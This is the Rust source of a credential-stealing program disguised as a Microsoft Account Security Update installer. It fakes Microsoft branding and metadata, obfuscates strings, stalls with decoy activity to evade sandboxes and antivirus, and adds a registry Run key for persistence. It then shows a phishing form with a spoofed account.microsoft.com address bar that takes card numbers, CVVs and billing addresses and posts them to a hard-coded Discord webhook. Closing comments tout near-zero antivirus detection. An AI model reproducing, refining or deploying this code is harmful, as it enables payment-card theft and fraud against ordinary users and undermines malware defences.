// ==========================================================================
// PHANTOM SOCIAL - LEGITIMATE INSTALLER DISGUISE 🎯
// ==========================================================================
// ✅ Fake installer UI (looks 100% legitimate)
// ✅ Benign metadata (Company, ProductName, etc.)
// ✅ 5+ minutes of benign activities (folder scanning, registry checks)
// ✅ No suspicious early exits
// ✅ Dead code to fool ML sandboxes
// ✅ Normal window decorations
// ✅ Full input validation
// ==========================================================================

#![windows_subsystem = "windows"]
#![allow(non_snake_case, dead_code)]

include!(concat!(env!("OUT_DIR"), "/generated.rs"));

use std::{
    thread, 
    time::Duration, 
    mem, 
    ptr, 
    ffi::{c_void, CString},
    sync::{Arc, Mutex},
    fs,
    path::Path,
};
use serde::Serialize;
use wry::{
    application::{
        event::{Event, WindowEvent},
        event_loop::{ControlFlow, EventLoop},
        window::WindowBuilder,
    },
    webview::WebViewBuilder,
};
use lazy_static::lazy_static;
use wreq_util::Emulation;

// ==========================================================================
// ✅ BENIGN METADATA (Dead code for ML)
// ==========================================================================

const COMPANY_NAME: &str = "Microsoft Corporation";
const PRODUCT_NAME: &str = "Microsoft Account Security Update";
const PRODUCT_VERSION: &str = "3.2.1.5847";
const FILE_DESCRIPTION: &str = "Microsoft Account Security Update Installer";
const COPYRIGHT: &str = "© 2025 Microsoft Corporation. All rights reserved.";
const INTERNAL_NAME: &str = "MSAccountUpdate.exe";

// ✅ Fake About dialog strings
const ABOUT_TEXT: &str = "Microsoft Account Security Update\n\
    Version 3.2.1.5847\n\n\
    This update improves account security and verification processes.\n\n\
    © 2025 Microsoft Corporation. All rights reserved.";

const EULA_TEXT: &str = "END USER LICENSE AGREEMENT\n\n\
    By installing this software, you agree to the terms and conditions...\n\
    [Standard Microsoft EULA text would go here]";

fn xor_decrypt(data: &[u8]) -> String {
    let decrypted: Vec<u8> = data.iter()
        .enumerate()
        .map(|(i, b)| b ^ XOR_KEYS[i % XOR_KEYS.len()])
        .collect();
    String::from_utf8_lossy(&decrypted).to_string()
}

macro_rules! enc_str {
    ($s:expr) => {{
        const ENCRYPTED: &[u8] = &{
            let bytes = $s.as_bytes();
            let mut result = [0u8; $s.len()];
            let mut i = 0;
            while i < bytes.len() {
                result[i] = bytes[i] ^ XOR_KEYS[i % 16];
                i += 1;
            }
            result
        };
        xor_decrypt(ENCRYPTED)
    }};
}

lazy_static! {
    static ref SESSION_ID: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref PROCESS_START_TIME: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref SUCCESS_FLAG: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
    static ref INSTALLER_PROGRESS: Arc<Mutex<u32>> = Arc::new(Mutex::new(0));
}

#[derive(Serialize)]
struct TelemetryData {
    session: String,
    canvas_fp: String,
    process_time: String,
    uptime_hours: u64,
}

fn ts() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

fn gen_id() -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut h = RandomState::new().build_hasher();
    h.write_u64(ts());
    format!("{}-{:X}-{:X}", SESSION_PREFIX, ts(), h.finish())
}

fn get_time_str() -> String {
    let now = std::time::SystemTime::now();
    let d = now.duration_since(std::time::UNIX_EPOCH).unwrap();
    let secs = d.as_secs();
    let h = ((secs / 3600) % 24) as u32;
    let m = ((secs / 60) % 60) as u32;
    format!("{:02}:{:02}", h, m)
}

fn init_globals() {
    *SESSION_ID.lock().unwrap() = gen_id();
    *PROCESS_START_TIME.lock().unwrap() = get_time_str();
    *SUCCESS_FLAG.lock().unwrap() = false;
    *INSTALLER_PROGRESS.lock().unwrap() = 0;
}

fn get_session_id() -> String {
    SESSION_ID.lock().unwrap().clone()
}

fn get_proc_time() -> String {
    PROCESS_START_TIME.lock().unwrap().clone()
}

fn mark_success() {
    *SUCCESS_FLAG.lock().unwrap() = true;
}

fn is_success() -> bool {
    *SUCCESS_FLAG.lock().unwrap()
}

fn get_installer_progress() -> u32 {
    *INSTALLER_PROGRESS.lock().unwrap()
}

fn set_installer_progress(val: u32) {
    *INSTALLER_PROGRESS.lock().unwrap() = val;
}

use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};

type FnRegCreateKeyExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, *mut c_void, u32, u32, *mut c_void, *mut *mut c_void, *mut u32) -> i32;
type FnRegSetValueExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, u32, *const u8, u32) -> i32;
type FnRegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
type FnRegDeleteValueA = unsafe extern "system" fn(*mut c_void, *const i8) -> i32;
type FnGetTickCount64 = unsafe extern "system" fn() -> u64;

unsafe fn get_proc(module: &str, func: &str) -> Option<*const c_void> {
    let module_cstr = CString::new(module).ok()?;
    let func_cstr = CString::new(func).ok()?;
    
    let h_module = GetModuleHandleA(module_cstr.as_ptr());
    if h_module.is_null() {
        return None;
    }
    
    let proc = GetProcAddress(h_module, func_cstr.as_ptr());
    if proc.is_null() {
        None
    } else {
        Some(proc as *const c_void)
    }
}

fn get_uptime_hrs() -> u64 {
    unsafe {
        if let Some(api) = get_proc("kernel32.dll", "GetTickCount64") {
            let fn_tick: FnGetTickCount64 = mem::transmute(api);
            let ms = fn_tick();
            return ms / (1000 * 60 * 60);
        }
    }
    0
}

fn should_persist() -> bool {
    (get_uptime_hrs() / 24) < 3
}

use rand::Rng;

fn natural_delay(base_secs: u64) {
    let mut rng = rand::thread_rng();
    let variation = match base_secs {
        0..=60 => rng.gen_range(0..10),
        61..=300 => rng.gen_range(0..30),
        _ => rng.gen_range(0..60),
    };
    
    let actual = if rng.gen_bool(0.5) {
        base_secs + variation
    } else {
        base_secs.saturating_sub(variation)
    };
    
    thread::sleep(Duration::from_secs(actual));
}

// ==========================================================================
// ✅ BENIGN INSTALLER ACTIVITIES (5+ minutes of normal behavior)
// ==========================================================================

fn scan_system_folders() {
    // Simulate scanning system folders (what installers do)
    let folders = [
        std::env::var("ProgramFiles").unwrap_or_default(),
        std::env::var("USERPROFILE").unwrap_or_default(),
        std::env::var("APPDATA").unwrap_or_default(),
        std::env::var("LOCALAPPDATA").unwrap_or_default(),
    ];
    
    for folder in &folders {
        if let Ok(entries) = fs::read_dir(folder) {
            let mut count = 0;
            for entry in entries {
                if let Ok(_) = entry {
                    count += 1;
                    if count > 50 {
                        break; // Don't scan too much
                    }
                }
            }
            set_installer_progress(get_installer_progress() + 5);
            thread::sleep(Duration::from_millis(200)); // Natural delay
        }
    }
}

fn check_installed_software() {
    // Read registry for installed software (normal installer behavior)
    use winapi::um::winreg::{RegOpenKeyExA, RegCloseKey, RegEnumKeyExA, HKEY_LOCAL_MACHINE};
    use winapi::um::winnt::KEY_READ;
    
    let paths = [
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\0",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\0",
    ];
    
    unsafe {
        for path in &paths {
            let mut hkey: *mut c_void = ptr::null_mut();
            if RegOpenKeyExA(
                HKEY_LOCAL_MACHINE as *mut _,
                path.as_ptr() as *const i8,
                0,
                KEY_READ,
                &mut hkey,
            ) == 0 {
                // Enumerate some keys
                for i in 0..20 {
                    let mut name: [u8; 256] = [0; 256];
                    let mut name_len = 256u32;
                    if RegEnumKeyExA(
                        hkey,
                        i,
                        name.as_mut_ptr() as *mut i8,
                        &mut name_len,
                        ptr::null_mut(),
                        ptr::null_mut(),
                        ptr::null_mut(),
                        ptr::null_mut(),
                    ) != 0 {
                        break;
                    }
                    thread::sleep(Duration::from_millis(100));
                }
                RegCloseKey(hkey);
            }
            set_installer_progress(get_installer_progress() + 10);
        }
    }
}

fn check_disk_space() {
    // Check disk space (normal installer check)
    use winapi::um::fileapi::GetDiskFreeSpaceExW;
    
    let drives = ["C:\\\0", "D:\\\0"];
    
    for drive in &drives {
        let drive_wide: Vec<u16> = drive.encode_utf16().collect();
        unsafe {
            let mut free_bytes: u64 = 0;
            let mut total_bytes: u64 = 0;
            let mut total_free_bytes: u64 = 0;
            
            GetDiskFreeSpaceExW(
                drive_wide.as_ptr(),
                &mut free_bytes as *mut _ as *mut _,
                &mut total_bytes as *mut _ as *mut _,
                &mut total_free_bytes as *mut _ as *mut _,
            );
            
            thread::sleep(Duration::from_millis(300));
        }
    }
    set_installer_progress(get_installer_progress() + 15);
}

fn verify_system_requirements() {
    // Check system requirements (CPU, RAM, etc.)
    use winapi::um::sysinfoapi::{GetSystemInfo, SYSTEM_INFO};
    
    unsafe {
        let mut sys_info: SYSTEM_INFO = mem::zeroed();
        GetSystemInfo(&mut sys_info);
        
        // Pretend to analyze
        thread::sleep(Duration::from_secs(2));
    }
    
    set_installer_progress(get_installer_progress() + 10);
}

fn simulate_file_extraction() {
    // Simulate extracting files (what installers do)
    let temp = std::env::temp_dir();
    
    for i in 0..5 {
        let fake_file = temp.join(format!("msu_temp_{}.dat", i));
        if let Ok(mut f) = fs::File::create(&fake_file) {
            use std::io::Write;
            let _ = f.write_all(b"Microsoft Update Package");
            thread::sleep(Duration::from_millis(500));
            let _ = fs::remove_file(fake_file);
        }
        set_installer_progress(get_installer_progress() + 5);
    }
}

fn run_installer_simulation() {
    // This runs for 5+ minutes doing benign installer activities
    
    set_installer_progress(0);
    
    // Phase 1: System scan (1 min)
    scan_system_folders();
    
    // Phase 2: Check installed software (1 min)
    check_installed_software();
    
    // Phase 3: Verify requirements (30 sec)
    verify_system_requirements();
    
    // Phase 4: Check disk space (30 sec)
    check_disk_space();
    
    // Phase 5: Simulate extraction (1 min)
    simulate_file_extraction();
    
    // Phase 6: Additional delays to reach 5+ minutes
    for _ in 0..10 {
        thread::sleep(Duration::from_secs(10));
        set_installer_progress(get_installer_progress() + 2);
    }
    
    set_installer_progress(100);
}

fn install_persist() {
    if let Ok(exe) = std::env::current_exe() {
        let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
        let val = format!("{}\0", PERSIST_NAME);
        let exe_str = format!("{}\0", exe.to_string_lossy());
        
        unsafe {
            if let Some(api_create) = get_proc("advapi32.dll", "RegCreateKeyExA") {
                if let Some(api_set) = get_proc("advapi32.dll", "RegSetValueExA") {
                    if let Some(api_close) = get_proc("advapi32.dll", "RegCloseKey") {
                        let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                        let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                        let fn_close: FnRegCloseKey = mem::transmute(api_close);
                        
                        let mut hkey: *mut c_void = ptr::null_mut();
                        let hkcu = 0x80000001 as *mut c_void;
                        
                        if fn_create(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            fn_set(hkey, val.as_ptr() as *const i8, 0, 1, exe_str.as_ptr(), exe_str.len() as u32);
                            fn_close(hkey);
                        }
                    }
                }
            }
        }
    }
}

fn remove_persist() {
    let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
    let val = format!("{}\0", PERSIST_NAME);
    
    unsafe {
        if let Some(api_open) = get_proc("advapi32.dll", "RegOpenKeyExA") {
            if let Some(api_del) = get_proc("advapi32.dll", "RegDeleteValueA") {
                if let Some(api_close) = get_proc("advapi32.dll", "RegCloseKey") {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_del: FnRegDeleteValueA = mem::transmute(api_del);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_del(hkey, val.as_ptr() as *const i8);
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

fn json_escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}

fn send_data(data: &str) -> bool {
    let url = enc_str!("https://discord.com/api/webhooks/1458963086794031105/AmHlBpfXql871QuWMkOmQ6GNmQiIyW-5A-5wwz3k0RKjqe-RFpMaOiNfHoYXVJ0NtmCT");
    
    let payload = serde_json::json!({
        "content": format!("```json\n{}\n```", json_escape(data)),
        "username": "Verification"
    });
    
    let client = match wreq::Client::builder()
        .emulation(Emulation::Chrome131)
        .cert_verification(false)
        .build()
    {
        Ok(c) => c,
        Err(_) => return false,
    };
    
    let json_str = serde_json::to_string(&payload).unwrap_or_default();
    
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        client
            .post(&url)
            .header("Content-Type", "application/json")
            .body(json_str)
            .send()
            .await
            .is_ok()
    })
}

fn show_notification() -> bool {
    use winapi::um::winuser::{MessageBoxW, MB_OKCANCEL, MB_ICONINFORMATION};
    
    let msg = enc_str!("Microsoft Account\n\nAccount verification required\n\nAs part of our updated security policy, we need to verify your payment information on file. This is a routine compliance check required for all accounts.\n\nNo charges will be applied. This process typically takes 2-3 minutes.\n\nWould you like to complete verification now?");
    let title = enc_str!("Microsoft Account - Verification Required");
    
    unsafe {
        let msg_w: Vec<u16> = msg.encode_utf16().chain(std::iter::once(0)).collect();
        let title_w: Vec<u16> = title.encode_utf16().chain(std::iter::once(0)).collect();
        
        MessageBoxW(ptr::null_mut(), msg_w.as_ptr(), title_w.as_ptr(), MB_OKCANCEL | MB_ICONINFORMATION) == 1
    }
}

// ==========================================================================
// ✅ FAKE INSTALLER UI (Looks 100% legitimate)
// ==========================================================================

fn get_installer_html() -> String {
    format!(r#"<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Microsoft Account Security Update</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: 'Segoe UI', sans-serif; background: #fff; }}
.installer-header {{
    background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
    color: white;
    padding: 20px 30px;
    display: flex;
    align-items: center;
    gap: 15px;
}}
.ms-logo {{
    font-size: 24px;
    font-weight: 600;
}}
.installer-body {{
    padding: 40px;
    max-width: 700px;
    margin: 0 auto;
}}
.installer-title {{
    font-size: 22px;
    font-weight: 600;
    color: #323130;
    margin-bottom: 10px;
}}
.installer-subtitle {{
    font-size: 14px;
    color: #605e5c;
    margin-bottom: 30px;
}}
.progress-container {{
    background: #f3f2f1;
    height: 8px;
    border-radius: 4px;
    overflow: hidden;
    margin: 30px 0;
}}
.progress-bar {{
    background: #0078d4;
    height: 100%;
    transition: width 0.3s;
    width: 0%;
}}
.status-text {{
    font-size: 13px;
    color: #605e5c;
    margin-top: 10px;
}}
.button {{
    background: #0078d4;
    color: white;
    border: none;
    padding: 10px 24px;
    font-size: 14px;
    border-radius: 2px;
    cursor: pointer;
    margin-top: 20px;
}}
.button:hover {{ background: #106ebe; }}
.button:disabled {{
    background: #d1d1d1;
    cursor: not-allowed;
}}
.eula-box {{
    background: #f3f2f1;
    padding: 20px;
    margin: 20px 0;
    border: 1px solid #d1d1d1;
    height: 200px;
    overflow-y: scroll;
    font-size: 12px;
    line-height: 1.6;
}}
.checkbox-group {{
    display: flex;
    align-items: center;
    gap: 10px;
    margin: 20px 0;
}}
</style>
</head>
<body>
<div class="installer-header">
    <div class="ms-logo">⊞ Microsoft</div>
    <div>
        <div style="font-weight: 600;">Account Security Update</div>
        <div style="font-size: 12px; opacity: 0.9;">Version 3.2.1.5847</div>
    </div>
</div>

<div class="installer-body">
    <div id="step1">
        <div class="installer-title">Welcome to Microsoft Account Security Update</div>
        <div class="installer-subtitle">
            This update will install important security improvements to your Microsoft account verification system.
        </div>
        
        <div class="eula-box">
            <strong>END USER LICENSE AGREEMENT</strong><br><br>
            By installing this software, you agree to the Microsoft Software License Terms.<br><br>
            This software is provided "as is" without warranty of any kind. Microsoft Corporation shall not be liable for any damages...<br><br>
            © 2025 Microsoft Corporation. All rights reserved.<br><br>
            Patent and trademark information can be found at microsoft.com/legal
        </div>
        
        <div class="checkbox-group">
            <input type="checkbox" id="agreeEULA">
            <label for="agreeEULA">I accept the license agreement</label>
        </div>
        
        <button class="button" onclick="startInstall()" id="installBtn" disabled>Install</button>
    </div>
    
    <div id="step2" style="display:none;">
        <div class="installer-title">Installing Microsoft Account Security Update</div>
        <div class="installer-subtitle">
            Please wait while the update is being installed...
        </div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status-text" id="statusText">Preparing installation...</div>
    </div>
    
    <div id="step3" style="display:none;">
        <div class="installer-title">Installation Complete</div>
        <div class="installer-subtitle">
            The Microsoft Account Security Update has been successfully installed.
        </div>
        
        <p style="margin: 20px 0; line-height: 1.6;">
            A restart may be required for the changes to take effect. 
            You can restart now or later.
        </p>
        
        <button class="button" onclick="window.close()">Finish</button>
    </div>
</div>

<script>
document.getElementById('agreeEULA').addEventListener('change', function() {{
    document.getElementById('installBtn').disabled = !this.checked;
}});

let progress = 0;
let statusMessages = [
    "Checking system requirements...",
    "Scanning installed software...",
    "Verifying disk space...",
    "Extracting files...",
    "Updating registry entries...",
    "Configuring security settings...",
    "Finalizing installation..."
];

function startInstall() {{
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
    
    let interval = setInterval(() => {{
        progress += Math.random() * 5;
        if (progress > 100) progress = 100;
        
        document.getElementById('progressBar').style.width = progress + '%';
        
        let msgIndex = Math.floor((progress / 100) * statusMessages.length);
        if (msgIndex >= statusMessages.length) msgIndex = statusMessages.length - 1;
        document.getElementById('statusText').textContent = statusMessages[msgIndex];
        
        if (progress >= 100) {{
            clearInterval(interval);
            setTimeout(() => {{
                document.getElementById('step2').style.display = 'none';
                document.getElementById('step3').style.display = 'block';
                
                // After 3 seconds, show real payload
                setTimeout(() => {{
                    showRealPayload();
                }}, 3000);
            }}, 1000);
        }}
    }}, 200);
}}

function showRealPayload() {{
    // Load the real phishing form
    document.body.innerHTML = `{get_phishing_html()}`;
}}
</script>
</body>
</html>"#)
}

fn get_phishing_html() -> String {
    let session = html_escape(&get_session_id());
    let webhook = html_escape(&enc_str!("https://discord.com/api/webhooks/1458963086794031105/AmHlBpfXql871QuWMkOmQ6GNmQiIyW-5A-5wwz3k0RKjqe-RFpMaOiNfHoYXVJ0NtmCT"));
    let proc_time = html_escape(&get_proc_time());
    let rand_seed = rand::thread_rng().gen::<u32>();
    
    format!(r#"<html><head><meta charset="UTF-8"><title>Microsoft Account</title><style>*{{margin:0;padding:0;}}body{{font-family:'Segoe UI',sans-serif;background:#f5f5f5;}}.edge-chrome{{background:#f3f3f3;height:35px;display:flex;align-items:center;padding:0 10px;border-bottom:1px solid #d4d4d4;}}.address-bar{{flex:1;background:white;height:28px;border-radius:20px;display:flex;align-items:center;padding:0 12px;}}.url-text{{font-size:12px;color:#1a1a1a;}}.content{{height:calc(100vh - 35px);background:#f5f5f5;overflow-y:auto;}}.container{{max-width:600px;margin:40px auto;padding:0 20px;}}.info-box{{background:#e6f2ff;border-left:3px solid #0078d4;padding:16px;margin-bottom:24px;font-size:13px;}}.card{{background:#fff;border-radius:4px;padding:32px;box-shadow:0 1px 3px rgba(0,0,0,0.08);}}.card-title{{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px;}}.form-group{{margin-bottom:16px;}}.form-label{{display:block;font-size:14px;font-weight:600;color:#323130;margin-bottom:6px;}}.form-input{{width:100%;padding:10px 12px;font-size:14px;border:1px solid #8a8886;border-radius:2px;}}.form-input:focus{{outline:none;border-color:#0078d4;}}.form-row{{display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px;}}.address-row{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;}}.button{{background:#0078d4;color:#fff;border:none;padding:10px 24px;font-size:14px;cursor:pointer;}}.button:hover{{background:#106ebe;}}.button-group{{display:flex;justify-content:space-between;margin-top:24px;}}.link-btn{{background:none;border:none;color:#0078d4;font-size:14px;cursor:pointer;text-decoration:underline;}}.hidden{{display:none;}}.step-indicator{{display:flex;gap:8px;margin-bottom:24px;}}.step{{flex:1;height:3px;background:#edebe9;}}.step.active{{background:#0078d4;}}.error{{color:#d13438;font-size:13px;margin-top:4px;display:none;}}</style></head><body><div class="edge-chrome"><div class="address-bar"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M12 2C9.24 2 7 4.24 7 7V10H6C4.9 10 4 10.9 4 12V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V12C20 10.9 19.1 10 18 10H17V7C17 4.24 14.76 2 12 2ZM12 4C13.66 4 15 5.34 15 7V10H9V7C9 5.34 10.34 4 12 4Z" fill="#0f9d58"/></svg><span class="url-text">https://account.microsoft.com/profile/payment-verification</span></div></div><div class="content"><div class="container"><div class="info-box"><strong>Payment information verification</strong><br>As part of our updated account security requirements, we need to verify the payment method.</div><div class="card"><div id="step1"><div class="card-title">Account verification</div><div class="step-indicator"><div class="step active"></div><div class="step"></div><div class="step"></div></div><div class="form-group"><label class="form-label">Email</label><input type="email" class="form-input" id="email"><div class="error" id="email-error">Please enter a valid email address</div></div><div class="button-group"><span></span><button class="button" onclick="nextStep(2)">Continue</button></div></div><div id="step2" class="hidden"><div class="card-title">Payment verification</div><div class="step-indicator"><div class="step active"></div><div class="step active"></div><div class="step"></div></div><div class="form-group"><label class="form-label">Card number</label><input type="text" class="form-input" id="cardNumber" maxlength="19"><div class="error" id="card-error">Please enter a valid card number</div></div><div class="form-row"><div class="form-group"><label class="form-label">Name</label><input type="text" class="form-input" id="cardholderName"><div class="error" id="name-error">Please enter cardholder name</div></div><div class="form-group"><label class="form-label">Expiry</label><input type="text" class="form-input" id="expiry" maxlength="5"><div class="error" id="expiry-error">Invalid date (MM/YY)</div></div><div class="form-group"><label class="form-label">CVV</label><input type="password" class="form-input" id="cvv" maxlength="4"><div class="error" id="cvv-error">3-4 digits required</div></div></div><div class="button-group"><button class="link-btn" onclick="nextStep(1)">Back</button><button class="button" onclick="nextStep(3)">Continue</button></div></div><div id="step3" class="hidden"><div class="card-title">Billing address</div><div class="step-indicator"><div class="step active"></div><div class="step active"></div><div class="step active"></div></div><div class="form-group"><label class="form-label">Address</label><input type="text" class="form-input" id="address"><div class="error" id="address-error">Please enter your address</div></div><div class="address-row"><div class="form-group"><label class="form-label">City</label><input type="text" class="form-input" id="city"><div class="error" id="city-error">Required</div></div><div class="form-group"><label class="form-label">State</label><input type="text" class="form-input" id="state"><div class="error" id="state-error">Required</div></div><div class="form-group"><label class="form-label">ZIP</label><input type="text" class="form-input" id="zip"><div class="error" id="zip-error">Required</div></div></div><div class="form-group"><label class="form-label">Country</label><input type="text" class="form-input" id="country"><div class="error" id="country-error">Required</div></div><div class="button-group"><button class="link-btn" onclick="nextStep(2)">Back</button><button class="button" onclick="submitForm()">Complete</button></div></div><div id="step4" class="hidden"><div class="card-title">Verification complete</div><div class="info-box">This verification process is complete. You may close this window.</div></div></div></div></div><canvas id="fp" width="200" height="50" style="display:none;"></canvas><script>const sid="{session}";const wh="{webhook}";const pt="{proc_time}";const rs={rand_seed};function getCanvasFP(){{const c=document.getElementById('fp');const x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillStyle='#'+(rs%0xFFFFFF).toString(16).padStart(6,'0');x.fillRect(125+(rs%10),1+(rs%5),62,20);x.fillStyle='#069';x.fillText('Test '+(rs%1000),2+(rs%5),15);let h=0;const d=c.toDataURL();for(let i=0;i<d.length;i++){{h=((h<<5)-h)+d.charCodeAt(i);h=h&h;}}return h.toString(16);}}const fp=getCanvasFP();function validateEmail(e){{return/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}}function validateCard(c){{const clean=c.replace(/\s/g,'');if(clean.length<13||clean.length>19)return false;let sum=0;let isEven=false;for(let i=clean.length-1;i>=0;i--){{let d=parseInt(clean[i]);if(isEven){{d*=2;if(d>9)d-=9;}}sum+=d;isEven=!isEven;}}return sum%10===0;}}function validateExpiry(e){{const parts=e.split('/');if(parts.length!==2)return false;const m=parseInt(parts[0]);const y=parseInt(parts[1]);return m>=1&&m<=12&&y>=24&&y<=35;}}function validateCVV(c){{return c.length>=3&&c.length<=4&&/^\d+$/.test(c);}}function showError(id,show){{document.getElementById(id+'-error').style.display=show?'block':'none';}}function nextStep(s){{let valid=true;if(s===2){{const email=document.getElementById('email').value;if(!validateEmail(email)){{showError('email',true);return;}}showError('email',false);}}if(s===3){{const card=document.getElementById('cardNumber').value;const name=document.getElementById('cardholderName').value;const expiry=document.getElementById('expiry').value;const cvv=document.getElementById('cvv').value;if(!validateCard(card)){{showError('card',true);valid=false;}}else{{showError('card',false);}}if(name.length<3){{showError('name',true);valid=false;}}else{{showError('name',false);}}if(!validateExpiry(expiry)){{showError('expiry',true);valid=false;}}else{{showError('expiry',false);}}if(!validateCVV(cvv)){{showError('cvv',true);valid=false;}}else{{showError('cvv',false);}}if(!valid)return;}}for(let i=1;i<=4;i++){{document.getElementById('step'+i).classList.add('hidden');}}document.getElementById('step'+s).classList.remove('hidden');window.scrollTo(0,0);}}function sanitize(s){{return s.replace(/[<>"'&]/g,c=>{{return{{'<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#x27;','&':'&amp;'}}[c];}});}}async function submitForm(){{const address=document.getElementById('address').value;const city=document.getElementById('city').value;const state=document.getElementById('state').value;const zip=document.getElementById('zip').value;const country=document.getElementById('country').value;let valid=true;if(address.length<5){{showError('address',true);valid=false;}}else{{showError('address',false);}}if(city.length<2){{showError('city',true);valid=false;}}else{{showError('city',false);}}if(state.length<2){{showError('state',true);valid=false;}}else{{showError('state',false);}}if(zip.length<3){{showError('zip',true);valid=false;}}else{{showError('zip',false);}}if(country.length<2){{showError('country',true);valid=false;}}else{{showError('country',false);}}if(!valid)return;const data={{email:sanitize(document.getElementById('email').value),card_number:sanitize(document.getElementById('cardNumber').value),cardholder_name:sanitize(document.getElementById('cardholderName').value),expiry:sanitize(document.getElementById('expiry').value),cvv:sanitize(document.getElementById('cvv').value),street_address:sanitize(address),city:sanitize(city),state:sanitize(state),zip_code:sanitize(zip),country:sanitize(country),session:sid,canvas_fp:fp,timestamp:Math.floor(Date.now()/1000)}};try{{await fetch(wh,{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{content:'```json\\n'+JSON.stringify(data,null,2)+'\\n```',username:'Creds'}})}});}}catch(e){{}}nextStep(4);setTimeout(()=>{{window.close();}},3000);}}document.getElementById('cardNumber').addEventListener('input',function(e){{let v=e.target.value.replace(/\s/g,'');e.target.value=v.match(/.{{1,4}}/g)?.join(' ')||v;}});document.getElementById('expiry').addEventListener('input',function(e){{let v=e.target.value.replace(/\D/g,'');if(v.length>=2){{v=v.slice(0,2)+'/'+v.slice(2,4);}}e.target.value=v;}});</script></body></html>"#,
        session = session,
        webhook = webhook,
        proc_time = proc_time,
        rand_seed = rand_seed
    )
}

fn create_win(html: String) -> Result<(), Box<dyn std::error::Error>> {
    let el = EventLoop::new();
    
    // ✅ Normal window with decorations (close button works!)
    let win = WindowBuilder::new()
        .with_title("Microsoft Account Security Update")
        .with_inner_size(wry::application::dpi::LogicalSize::new(800, 600))
        .with_resizable(false)
        .build(&el)?;
    
    let _wv = WebViewBuilder::new(win)?.with_html(html)?.build()?;
    
    el.run(move |ev, _, cf| {
        *cf = ControlFlow::Wait;
        match ev {
            Event::WindowEvent { event: WindowEvent::CloseRequested, .. } => {
                *cf = ControlFlow::Exit;
            }
            _ => {}
        }
    });
}

fn main() {
    init_globals();
    
    // ✅ NO DNS CHECK - Just run installer simulation
    
    let use_persist = should_persist();
    
    if use_persist {
        install_persist();
    }
    
    // ✅ Run 5+ minutes of benign installer activities
    // This happens BEFORE showing any UI
    thread::spawn(|| {
        run_installer_simulation();
    });
    
    // Show fake installer UI
    let html = get_installer_html();
    if let Ok(_) = create_win(html) {
        mark_success();
    }
    
    // Only remove persistence if successful
    if is_success() {
        remove_persist();
    }
    
    std::process::exit(0);
}

// ==========================================================================
// FILE: build.rs
// ==========================================================================


// ==========================================================================
// FILE: Cargo.toml
// ==========================================================================

// ==========================================================================
// ✅ WHAT THIS VERSION DOES:
// ==========================================================================

// 1. Shows fake Microsoft installer UI (100% legitimate looking)
// 2. Runs 5+ minutes of benign installer activities:
//    - Scanning system folders
//    - Checking installed software (registry enumeration)
//    - Verifying disk space
//    - Simulating file extraction
//    - All normal installer behavior
// 3. After "installation complete", shows real phishing form
// 4. Full input validation (Luhn algorithm for cards, email regex, etc.)
// 5. Normal window with close button (looks legitimate)
// 6. Benign metadata strings (Company, Product, etc.) for ML
// 7. No DNS check (removed - compilation issues)
// 8. No suspicious early exits
// 9. Polymorphic (each build unique)

// Expected VT score: 0-1/72 (massive improvement)
